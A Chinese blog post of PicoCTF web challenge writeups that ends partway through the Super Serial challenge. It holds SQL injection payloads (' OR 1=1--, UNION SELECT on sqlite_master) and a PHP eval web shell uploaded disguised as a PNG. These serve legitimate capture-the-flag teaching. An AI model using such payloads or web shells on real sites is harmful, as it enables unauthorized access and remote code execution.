class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">June 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>Post(s)</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">May 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>Post(s)</span></div></a></li></ul></div><hr></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="Theme" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="Panel"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="Popular"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="Play"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="Switch"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">Original</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/PicoCTF/" itemprop="url">PicoCTF</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>Cybersecurity</span></a><a class="article-meta__tags" href="/tags/PicoCTF/" tabindex="-1" itemprop="url"> <span><i class="anzhiyufont anzhiyu-icon-hashtag"></i>PicoCTF</span></a></span></div></div><h1 class="post-title" itemprop="name headline">All-in-One PicoCTF Writeups: Web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 07:57:03">2024-06-01</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-09-01T12:06:47.030Z" title="Updated 2024-09-01 17:36:47">2024-09-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字數"></i><span class="post-meta-label" title="文章字數">Word count:</span><span class="word-count" title="文章字數">6.4k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="閱讀時長"></i><span class="post-meta-label" title="閱讀時長">Reading time:</span><span>28min</span></span><span class="post-meta-separator"></span><span data-flag-title="All-in-One PicoCTF Writeups: Web"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="閱讀量">Post views:</span><span id="twikoo_visitors" title="訪問量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator"> </span><span class="post-meta-position" title="作者IP屬地爲Taiwan"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>Taiwan</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/4f98706e/#post-comment" tabindex="-1"><span id="twikoo-count"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/upload_4810c93f4ec30864588fcab3bf179d5f.png"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="https://blog.S1l3ntC0nquer.in/posts/4f98706e/"><header><a class="post-meta-categories" href="/categories/PicoCTF/" itemprop="url">PicoCTF</a><a href="/tags/%E8%B3%87%E5%AE%89/" tabindex="-1" itemprop="url">Cybersecurity</a><a href="/tags/PicoCTF/" tabindex="-1" itemprop="url">PicoCTF</a><h1 id="CrawlerTitle" itemprop="name headline">All-in-One PicoCTF Writeups: Web</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">S1l3ntC0nquer</span><time itemprop="dateCreated datePublished" datetime="2024-06-01T02:27:03.000Z" title="Created 2024-06-01 07:57:03">2024-06-01</time><time itemprop="dateCreated datePublished" datetime="2024-09-01T12:06:47.030Z" title="Updated 2024-09-01 17:36:47">2024-09-01</time></header><h1 id="前言">前言</h1><p>其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言 XD。</p><p>自己在刷 PicoCTF 的時候常常發現，幾乎所有的 writeup 都是英文的居多，所以想說來寫個完整一點的中文版！總之呢這裡就是會盡量彙整所有的 picoCTF 的題目在這邊（但是因為已經寫了 60 題左右才開始打算來寫 writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的 writeup，就這樣啦！希望能幫忙到你。</p><h1 id="unminify">unminify</h1><p>先看題目，點開後他會說如果你打開了這個網頁，代表你的瀏覽器已經收到了 flag，只是他不知道要怎麼讀取它。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701091116470.png" alt="題目"></p><p>既然他說了我們瀏覽器已經收到 flag 了，就打開 F12 看一下網頁代碼吧！點開開發者工具後，直接在 Element 的 Tab 裡面用 <code>Ctrl+F</code>搜尋 <code>picoCTF</code>字串，結果就直接找到了 XD。欸不是這題也太水了吧！</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701091535175.png" alt="利用開發者工具搜尋flag"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;pr3tty_c0d3_dbe259ce&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Includes">Includes</h1><p>這個題目給了一個網站，長下面這樣。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240929233408223.png" alt="Website"></p><p>只有一個東西，沒什麼資訊，只有這個點了 say hello 會有一個 alert。直接點開 F12 先看一下有甚麼 JS 或其他東西，結果發現了 <code>script.js</code>，點開看後會發現有半個 Flag。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">greetings</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"This code is in a separate file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//  f7w_2of2_b8f4b022&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然後繼續看會發現還有一個 <code>style.css</code>，有前半部的 Flag。</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>
    <span class="token property">background-color</span><span class="token punctuation">:</span> lightblue<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*  picoCTF&#123;1nclu51v17y_1of2_  */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以就可以拼出整個 Flag 啦。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;1nclu51v17y_1of2_f7w_2of2_b8f4b022&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="picobrowser">picobrowser</h1><p>這題我們點進 URL 後會看到一個 FLAG 的按鈕，按下去會發現我們不能得到 FLAG。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SJB9S0p70.png" alt="題目"></p><p>他說我們應該要是 picobrowser，所以我就寫了一個 selenium 的 Python 腳本來運行，看看能不能拿到 flag。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>chrome<span class="token punctuation">.</span>service <span class="token keyword">import</span> Service
<span class="token keyword">from</span> webdriver_manager<span class="token punctuation">.</span>chrome <span class="token keyword">import</span> ChromeDriverManager
<span class="token keyword">import</span> time

my_user_agent <span class="token operator">=</span> <span class="token string">"picobrowser"</span> <span class="token comment"># 這裡把agent改為picobrowser</span>
chrome_options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
chrome_options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"--user-agent=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>my_user_agent<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
service <span class="token operator">=</span> Service<span class="token punctuation">(</span>executable_path<span class="token operator">=</span>ChromeDriverManager<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>install<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>service<span class="token operator">=</span>service<span class="token punctuation">,</span> options<span class="token operator">=</span>chrome_options<span class="token punctuation">)</span>

url <span class="token operator">=</span> <span class="token string">"https://jupiter.challenges.picoctf.org/problem/28921/flag"</span>

driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3345</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣就得到 flag 了！</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;p1c0_s3cr3t_ag3nt_84f9c865&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="SQLiLite">SQLiLite</h1><p>題目是一個登入頁面。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701092406670.png" alt="題目"></p><p>我們先嘗試用 <code>admin, admin</code>登入看看。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701092632509.png" alt="Login as admin"></p><p>它會說 Login failed，但是我們可以看到它的 SQL 查詢語句是</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">SELECT * FROM users WHERE name&#x3D;&#39;admin&#39; AND password&#x3D;&#39;admin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以我們就可以很輕鬆的用 SQL Injection 啦！這邊使用帳號 <code>' OR 1=1--</code>登入就可以啦，密碼不用輸入，或是隨便輸入也行。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701093002857.png" alt="Logged in"></p><p>但是他說 flag 在 plainsight 裡面所以我們看不見，那就打開開發者工具用 <code>Ctrl+F</code>搜尋吧！</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240701093133835.png" alt="flag"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;L00k5_l1k3_y0u_solv3d_it_d3c660ac&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="More-SQLi">More SQLi</h1><p>把題目 launch 了之後會進入到一個登入頁面，如下圖。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/BySNOmYUC.png" alt="題目"></p><p>然後我們先嘗試使用 <code>admin</code>作為帳號密碼登入。帳號密碼都輸入 <code>admin</code>後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/r1wnu7KIR.png" alt=""></p><p>圖片有點小，總之他顯示的內容就是像下面這樣:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">username: admin
password: admin
SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以我們在這邊把密碼用 <code>'OR 1=1 --</code>這串 payload 作為輸入（帳號可以隨便輸入），整個 SQL 的 query 就會變成這樣:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> id <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> password <span class="token operator">=</span> <span class="token string">''</span><span class="token operator">OR</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">--' AND username = 'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以從上面的代碼高亮的顏色發現，在 <code>1=1</code>後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/rJjw6XYUC.png" alt=""></p><p>他可以查詢 City 的名稱，但其實一筆資料包含了 City, Address, Phone。分析一下後台可能的 SQL 語句，應該是如下:</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> city<span class="token punctuation">,</span> address<span class="token punctuation">,</span> phone <span class="token keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="token keyword">WHERE</span> city <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再來因為題目有告訴我們系統使用的是 SQLite，所以會有一個叫做 <code>sqlite_master</code>的表來儲存一些表格的各種資訊。（<a target="_blank" rel="noopener" href="https://blog.csdn.net/luoshabugui/article/details/108327936">資訊來源</a>）</p><p>知道這些候我們輸入 <code>' UNION SELECT name, sql, 3345 FROM sqlite_master; --</code>讓整個 SQL 語句變成如下</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> city<span class="token punctuation">,</span> address<span class="token punctuation">,</span> phone <span class="token keyword">FROM</span> &#123;TABLE_NAME&#125; <span class="token keyword">WHERE</span> city <span class="token operator">=</span> <span class="token string">''</span> <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> name<span class="token punctuation">,</span> <span class="token keyword">sql</span><span class="token punctuation">,</span> <span class="token number">3345</span> <span class="token keyword">FROM</span> sqlite_master<span class="token punctuation">;</span> <span class="token comment">--';</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是 sqlite_master 的表格內容，如下:</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/BysgmNY8R.png" alt="找到flag所在的表格了"></p><p>我們可以看到被紅色框框圈住的地方就是我們所想獲得的 flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段 payload <code>' UNION SELECT 1, flag, 1 FROM more_table; --</code>。輸入後就可以看到以下的介面啦！</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SyoSNNtLA.png" alt="flag"></p><p>flag 就找到囉！</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="Trickster">Trickster</h1><p>這題的題目是一個可以上傳 png 的網頁，看起來就是文件上傳漏洞，頁面如下:</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HkocKNtIA.png" alt="題目"></p><p><s>秉持著不知道要幹嘛的時候先掃路徑的精神</s>，可以找到它的 robots.txt，它其中禁止了兩個路徑，如下:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>既然它都禁止了，我們就去看看吧 XD。<code>/uploads/</code>應該就是它的上傳後的文件路徑了，而它 instructions.txt 的內容如下:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以我們知道後端驗證檔案是否為 png 的方法有二，其一為檢查文件後綴名是否為 <code>.png</code>；其二為驗證文件的 magic bytes，看文件在十六進制中的前幾個位元組是否為 <code>50 4E 47</code>。</p><p>知道了這些信息後，我們先隨便找一張 png 圖片上傳看看吧！（我這邊直接隨便截圖，並命名為 <code>hack.png</code>）。並且在 upload 的過程中用 Burp suite 去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為 <code>hack.png.php</code>，並在檔案內容的 PNG 以下添加這個<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">php 一句話木馬</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>整個修改完後如下（點開來看可能會比較清楚）:</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/Sy7rFrYU0.png" alt="一句話木馬"></p><p>上傳完成後，現在這個 shell 就會位於 <code>a</code>這個位置上啦。</p><p>接下來再用<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/antSword">中國蟻劍</a>這款工具去連接那個 web shell 就可以啦，連接過程如下:</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HJo4cSF8A.png" alt="輸入連接資訊"></p><p>連接完成後，就可以直接看一下網站的文件，看到以下這個 <code>.txt</code>應該就是 flag 了。</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/SyahqSYLR.png" alt="貌似是flag的文件"></p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hackmd.io/_uploads/HJW1sBtI0.png" alt="flag出來了"></p><p>於是我們就成功找到了 flag 啦！如下:</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>這邊補充一個知識點，來講一下 <code>&lt;?php @eval($_POST['shell']);?&gt;</code>到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！</p><blockquote><p>當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：</p><ol><li><code>&lt;?php</code> 是 PHP 代碼的開始標記。</li><li><code>@eval($_POST['shell']);</code> 中的 <code>eval()</code> 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 <code>shell</code> 的變量。</li><li><code>@</code> 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。</li><li>由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。</li></ol><p>簡言之，任何通過 <code>shell</code> 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。</p></blockquote><p>然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下<a target="_blank" rel="noopener" href="https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18">這篇</a>。</p><h1 id="Super-Serial">Super Serial</h1><p>這題先讀取 <code>/robots.txt</code>發現它有一個禁止的路徑為 <code>/admin.phps</code>，這似乎代表著它有支持 <code>.phps</code>文件。所以可以到 <code>/index.phps</code>裡面看它的源代碼。（<code>phps</code>為 PHP source）</p><p><img src= "/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://raw.githubusercontent.com/S1l3ntC0nquer/MyBlogPhotos/main/image/image-20240704170553939.png" alt="index.phps"></p><p>題目說 Flag 在 <code>../flag</code>中，所以解題的思路就是要想辦法讀取到 <code>../flag</code>。先把圖片上的程式碼拿出來分析一下。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">require_once</span> <span class="token string double-quoted-string">"cookie.php"</span><span class="token punctuation">;</span>  <span class="token comment"># 這裡用到了cookie.php</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQLite3</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"../users.db"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"pass"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: authentication.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment"># 這裡重定向到authentication.php</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;h6 class="text-center" style="color:red">Invalid Login.&lt;/h6>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由於可以透過 <code>.phps</code>查看原始代碼，所以先去查看 <code>cookie.phps</code>和 <code>authentication.phps</code>。</p><p>authentication.php 如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">access_log</span>
<span class="token punctuation">&#123;</span>
	<span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">function</span> <span class="token function-definition function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
